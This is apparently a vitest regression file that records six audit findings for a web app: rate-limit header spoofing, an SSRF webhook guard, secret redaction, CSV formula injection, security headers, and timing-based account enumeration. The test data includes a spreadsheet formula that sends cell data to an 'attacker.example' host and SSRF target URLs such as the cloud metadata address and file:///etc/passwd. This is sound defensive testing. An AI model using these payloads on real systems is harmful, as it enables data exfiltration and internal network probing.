/**
 * The contract a production security review left behind, 2026-09-20.
 *
 * Six findings, each reproduced here as the behaviour that was wrong before the
 * fix. They are grouped in one file for the same reason `auth-hardening.test.ts`
 * is: an audit's conclusions are worth keeping as a set, so the next person can
 * read what was looked at as well as what was changed.
 */
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, expect, it } from 'vitest';
import { eq } from 'drizzle-orm';
import { loadEnv } from '../src/env';
import { startServer, type StartedServer } from '../src/server';
import { isPrivateAddress, isSafeWebhookUrl } from '../src/lib/notify';
import { csvCell } from '../src/routes/activity';
import { teams } from '../src/db/schema';

let srv: StartedServer;
let dir: string;
let cookie: Record<string, string>;

beforeAll(async () => {
  dir = mkdtempSync(path.join(tmpdir(), 'stma-audit-0920-'));
  srv = await startServer(
    loadEnv({
      port: 0,
      host: '127.0.0.1',
      nodeEnv: 'test',
      devMode: true,
      databaseUrl: undefined,
      pgliteDir: dir,
      // One proxy of our own in front, which is the stma.ai shape once
      // Cloudflare is counted: the chain ends `…, client, edge`.
      trustedProxyHops: 1,
    }),
  );
  const login = await fetch(`${srv.url}/auth/dev`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ username: 'audit-owner' }),
    redirect: 'manual',
  });
  cookie = { cookie: login.headers.getSetCookie().map((l) => l.split(';')[0]).join('; ') };
});

afterAll(async () => {
  await srv?.close();
  rmSync(dir, { recursive: true, force: true });
});

const form = (url: string, body: Record<string, string>, extra: Record<string, string> = {}) =>
  fetch(`${srv.url}${url}`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded', ...cookie, ...extra },
    body: new URLSearchParams(body),
    redirect: 'manual',
  });

/* ------------------------------------------------------------------ F1
 * lib/ratelimit.ts — every per-IP limit was keyed on a header the caller sets.
 * X-Forwarded-For is a list each proxy appends to, so its leftmost entry is
 * whatever the client typed. Reading it meant a fresh identity per request and
 * no volumetric brake on the one door that has no per-account counter behind
 * it: the private beta access code, checked before the email is looked at.
 */
it('F1: a forged X-Forwarded-For does not buy a new rate-limit identity', async () => {
  // Same real client behind the proxy, twenty different forged prefixes. The
  // /auth limiter allows 30 a minute; this would sail through on the old key.
  const forged = (n: number) => ({ 'x-forwarded-for': `203.0.113.${n}, 198.51.100.7, 10.1.2.3` });
  let limited = 0;
  for (let i = 0; i < 40; i++) {
    const res = await form('/auth/local/login', { email: `f1-${i}@example.com`, password: 'nope123456' }, forged(i));
    if (res.status === 429) limited += 1;
  }
  expect(limited, 'the forged prefixes are ignored, so the window closes').toBeGreaterThan(0);

  // And the entry it does count is the one the trusted hop count names: a
  // genuinely different client behind the same proxy still gets its own window.
  const other = await form(
    '/auth/local/login',
    { email: 'f1-other@example.com', password: 'nope123456' },
    { 'x-forwarded-for': '203.0.113.1, 198.51.100.99, 10.1.2.3' },
  );
  expect(other.status).not.toBe(429);
});

/* ------------------------------------------------------------------ F2
 * lib/notify.ts — the SSRF guard missed every IPv6 form. `h === '::1'` was dead
 * code: the WHATWG parser hands IPv6 back inside brackets, so the comparison
 * could never match. 0.0.0.0, unique-local, link-local, a trailing-dot
 * localhost and cloud metadata hostnames all walked through it.
 */
it('F2: the webhook guard refuses every spelling of our own network', () => {
  const refused = [
    'https://[::1]/x',
    'https://[0:0:0:0:0:0:0:1]/x',
    'https://[::ffff:127.0.0.1]/x',
    'https://[fd00::1]/x',
    'https://[fe80::1]/x',
    'https://0.0.0.0/x',
    'https://localhost./x',
    'https://metadata.google.internal/x',
    'https://169.254.169.254/x',
    'https://127.0.0.1/x',
    // Decimal and short forms normalize to 127.0.0.1 in the parser.
    'https://127.1/x',
    'https://2130706433/x',
    'https://100.64.0.1/x',
    'https://10.0.0.5/x',
    'https://172.16.0.5/x',
    'https://192.168.1.5/x',
    // Production is https-only; a plain-http target is refused whatever it names.
    'http://hooks.slack.com/services/T/B/x',
    'file:///etc/passwd',
    'not a url',
  ];
  for (const url of refused) expect(isSafeWebhookUrl(url, true), url).toBe(false);

  for (const url of ['https://hooks.slack.com/services/T/B/x', 'https://discord.com/api/webhooks/1/x']) {
    expect(isSafeWebhookUrl(url, true), url).toBe(true);
  }

  // The address predicate is used twice: on what somebody typed, and on what
  // their hostname resolved to. It has to answer for a bare address as well.
  expect(isPrivateAddress('::1')).toBe(true);
  expect(isPrivateAddress('169.254.169.254')).toBe(true);
  expect(isPrivateAddress('8.8.8.8')).toBe(false);
  expect(isPrivateAddress('2606:4700:4700::1111')).toBe(false);
});

/* ------------------------------------------------------------------ F3
 * routes/api.ts + routes/mcp.ts — an announcement's body was scrubbed into
 * `messages.body` and then sent raw to the team's Slack webhook and written raw
 * into the activity feed, which the page renders and the CSV exports. The
 * webhook also contradicted its own documented contract, which is that it
 * carries event metadata and never message bodies.
 */
it('F3: an announcement body is redacted into the feed and never sent to the webhook', async () => {
  expect((await form('/app/teams', { name: 'Audit Lab' })).status).toBe(302);
  const [team] = await srv.db.select().from(teams).where(eq(teams.slug, 'audit-lab'));
  const page = await (await fetch(`${srv.url}/app/teams/audit-lab?tab=integrations`, { headers: cookie })).text();
  const token = /\/api\/hooks\/announce\/([A-Za-z0-9_-]+)/.exec(page)?.[1];
  expect(token, 'the inbound hook token is on the integrations tab').toBeTruthy();

  const secret = `stma_${'d'.repeat(40)}`;
  const posted = await fetch(`${srv.url}/api/hooks/announce/${token}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ text: `Deploy finished, token ${secret}` }),
  });
  expect(posted.status).toBe(200);

  const activity = await (await fetch(`${srv.url}/app/teams/audit-lab/activity`, { headers: cookie })).text();
  expect(activity).toContain('announce');
  expect(activity, 'the feed carries the same redaction the stored message does').not.toContain(secret);

  const csv = await (await fetch(`${srv.url}/app/teams/audit-lab/activity.csv`, { headers: cookie })).text();
  expect(csv).not.toContain(secret);
  expect(team).toBeTruthy();
});

/* ------------------------------------------------------------------ F4
 * routes/activity.tsx — the CSV escaped quotes and nothing else. Excel and
 * LibreOffice evaluate a cell beginning `=`, `+`, `-` or `@` even inside
 * quotes, and several of the exported columns carry text somebody else wrote:
 * a workspace or project name, and `detail`, which the MCP announce tool
 * writes with no prefix in front of it.
 */
it('F4: a cell that would run in a spreadsheet is exported as text', () => {
  // Nothing in front of it, which is the case the announce tool produces.
  expect(csvCell('=HYPERLINK("https://attacker.example/?d="&A1,"ok")')).toBe(
    `"'=HYPERLINK(""https://attacker.example/?d=""&A1,""ok"")"`,
  );
  for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
    expect(csvCell(`${lead}cmd`), lead).toBe(`"'${lead}cmd"`);
  }
  // Ordinary text is untouched, and quotes are still doubled for the file
  // format itself. Armouring that mangled every other row would be its own bug.
  expect(csvCell('deploy finished')).toBe('"deploy finished"');
  expect(csvCell('he said "no"')).toBe('"he said ""no"""');
  expect(csvCell(null)).toBe('""');
  // A formula that is not at the start of a cell is not a formula.
  expect(csvCell('hook: =HYPERLINK(1)')).toBe('"hook: =HYPERLINK(1)"');
});

it('F4: the real export still carries what the hook wrote', async () => {
  const page = await (await fetch(`${srv.url}/app/teams/audit-lab?tab=integrations`, { headers: cookie })).text();
  const token = /\/api\/hooks\/announce\/([A-Za-z0-9_-]+)/.exec(page)?.[1];
  await fetch(`${srv.url}/api/hooks/announce/${token}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ text: '=HYPERLINK("https://attacker.example/?d="&A1,"ok")' }),
  });
  const csv = await (await fetch(`${srv.url}/app/teams/audit-lab/activity.csv`, { headers: cookie })).text();
  expect(csv).toContain('=HYPERLINK');
  // No cell in the file opens with a character a spreadsheet would evaluate.
  for (const cell of csv.match(/"(?:[^"]|"")*"/g) ?? []) {
    expect(/^"[=+\-@\t\r]/.test(cell), cell.slice(0, 60)).toBe(false);
  }
});

/* ------------------------------------------------------------------ F5
 * app.tsx — no security response headers existed at all. There is no XSS here
 * today, which is the argument for having them: the only thing between a future
 * `href={someStoredUrl}` and a javascript: payload was the review that catches
 * it.
 */
it('F5: every response carries the headers that make an XSS harder to land', async () => {
  for (const url of ['/', '/login', '/app/teams/audit-lab']) {
    const res = await fetch(`${srv.url}${url}`, { headers: cookie, redirect: 'manual' });
    expect(res.headers.get('x-content-type-options'), url).toBe('nosniff');
    expect(res.headers.get('x-frame-options'), url).toBe('DENY');
    expect(res.headers.get('referrer-policy'), url).toBe('same-origin');
    const csp = res.headers.get('content-security-policy') ?? '';
    expect(csp, url).toContain("frame-ancestors 'none'");
    expect(csp, url).toContain("object-src 'none'");
    // One external script from this origin and no inline script anywhere, so
    // scripts get no unsafe-inline; `style="…"` attributes are on nearly every
    // page, so styles do.
    expect(csp, url).toContain("script-src 'self'");
    expect(csp, url).toContain("style-src 'self' 'unsafe-inline'");
    // Never over plain http, or a developer's browser gets pinned to https on
    // localhost by a local run.
    expect(res.headers.get('strict-transport-security'), url).toBeNull();
  }
});

/* ------------------------------------------------------------------ F6
 * routes/auth.tsx — /forgot went to real lengths for an answer that is neutral
 * in words, then awaited an HTTPS round trip to the mail provider only for an
 * address that exists. A few milliseconds against a few hundred answers the
 * same question the words refuse to.
 */
it('F6: /forgot answers a known and an unknown address at the same speed', async () => {
  await form('/auth/local/signup', {
    email: 'f6-known@example.com',
    username: 'f6known',
    password: 'forgotpass123',
  });
  const sample = async (email: string) => {
    const runs: number[] = [];
    for (let i = 0; i < 6; i++) {
      const started = performance.now();
      await form('/auth/local/forgot', { email }, { 'x-forwarded-for': `203.0.113.${i}, 198.51.100.${i}, 10.1.2.3` });
      runs.push(performance.now() - started);
    }
    runs.sort((a, b) => a - b);
    return runs[Math.floor(runs.length / 2)]!;
  };
  const known = await sample('f6-known@example.com');
  const unknown = await sample('f6-never-existed@example.com');
  // The memory transport is fast either way, so this cannot prove the
  // production gap is gone; it pins that the request path does not grow a wait
  // the other branch has not got. The real property is structural: the send is
  // started and never awaited.
  expect(known).toBeLessThan(unknown * 4 + 25);
});
